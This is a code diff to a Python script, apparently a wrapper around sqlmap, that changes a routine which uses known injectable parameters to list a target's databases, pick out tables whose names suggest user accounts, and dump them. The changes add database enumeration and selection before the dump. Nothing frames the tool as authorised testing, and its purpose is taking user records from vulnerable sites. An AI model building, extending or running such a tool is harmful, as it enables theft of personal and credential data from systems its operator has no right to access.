@@ -360,12 +360,60 @@ def run_users_dump():
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # STEP 1: Find all user tables using YOUR TECHNIQUES
-    user_tables = find_user_tables(sqlmap_path, exploit_path, vuln_params)
+    # STEP 1: Get all databases
+    databases = get_databases(sqlmap_path, exploit_path, vuln_params)
     
-    if not user_tables:
-        print(Fore.YELLOW + "\n[!] No user tables found!" + Style.RESET_ALL)
-        print(Fore.YELLOW + "[!] The database may not contain user tables." + Style.RESET_ALL)
+    if not databases:
+        print(Fore.YELLOW + "\n[!] No databases found!" + Style.RESET_ALL)
+        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
+        return
+    
+    # Show databases and let user select
+    print(Fore.CYAN + "\n" + "="*60)
+    print("AVAILABLE DATABASES:")
+    print("="*60 + Style.RESET_ALL)
+    for i, db in enumerate(databases, 1):
+        display_name = db if db else "current database"
+        print(f"{i}. {display_name}")
+    print("="*60)
+    
+    db_choice = input(Fore.YELLOW + "\nSelect database number (or press Enter for ALL): " + Style.RESET_ALL).strip()
+    
+    selected_databases = []
+    if db_choice == "":
+        selected_databases = databases
+        print(Fore.GREEN + "[+] Will scan ALL databases" + Style.RESET_ALL)
+    else:
+        try:
+            idx = int(db_choice) - 1
+            if 0 <= idx < len(databases):
+                selected_databases = [databases[idx]]
+                print(Fore.GREEN + f"[+] Selected: {databases[idx]}" + Style.RESET_ALL)
+            else:
+                print(Fore.RED + "❌ Invalid selection!" + Style.RESET_ALL)
+                input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
+                return
+        except ValueError:
+            print(Fore.RED + "❌ Invalid input!" + Style.RESET_ALL)
+            input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
+            return
+    
+    # STEP 2: Find user tables from selected databases
+    all_user_tables = []
+    
+    for db in selected_databases:
+        print(Fore.CYAN + f"\n[+] Scanning database: {db if db else 'current'}" + Style.RESET_ALL)
+        tables = get_tables_from_db(sqlmap_path, exploit_path, vuln_params, db)
+        
+        for table in tables:
+            table_lower = table.lower()
+            if any(kw in table_lower for kw in USER_TABLE_KEYWORDS):
+                full_name = f"{db}.{table}" if db else table
+                if full_name not in all_user_tables:
+                    all_user_tables.append(full_name)
+    
+    if not all_user_tables:
+        print(Fore.YELLOW + "\n[!] No user tables found in selected databases!" + Style.RESET_ALL)
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
@@ -373,7 +421,7 @@ def run_users_dump():
     print(Fore.CYAN + "\n" + "="*60)
     print("FOUND USER TABLES:")
     print("="*60 + Style.RESET_ALL)
-    for i, table in enumerate(user_tables, 1):
+    for i, table in enumerate(all_user_tables, 1):
         print(f"{i}. {table}")
     print("="*60)
     
@@ -382,14 +430,14 @@ def run_users_dump():
     
     tables_to_dump = []
     if dump_all in ("", "y", "yes"):
-        tables_to_dump = user_tables
+        tables_to_dump = all_user_tables
     else:
         print(Fore.CYAN + "Enter table numbers to dump (comma-separated, e.g., 1,3,5):" + Style.RESET_ALL)
         selection = input(Fore.YELLOW + "Selection: " + Style.RESET_ALL).strip()
         if selection:
             try:
                 indices = [int(x.strip()) - 1 for x in selection.split(",") if x.strip()]
-                tables_to_dump = [user_tables[i] for i in indices if 0 <= i < len(user_tables)]
+                tables_to_dump = [all_user_tables[i] for i in indices if 0 <= i < len(all_user_tables)]
             except:
                 print(Fore.RED + "❌ Invalid selection." + Style.RESET_ALL)
                 input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
@@ -400,7 +448,7 @@ def run_users_dump():
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # STEP 2: Dump selected tables with YOUR TECHNIQUES
+    # STEP 3: Dump selected tables with YOUR TECHNIQUES
     print(Fore.CYAN + "\n" + "="*60)
     print(f"DUMPING {len(tables_to_dump)} USER TABLES WITH YOUR TECHNIQUES")
     print("="*60 + Style.RESET_ALL)
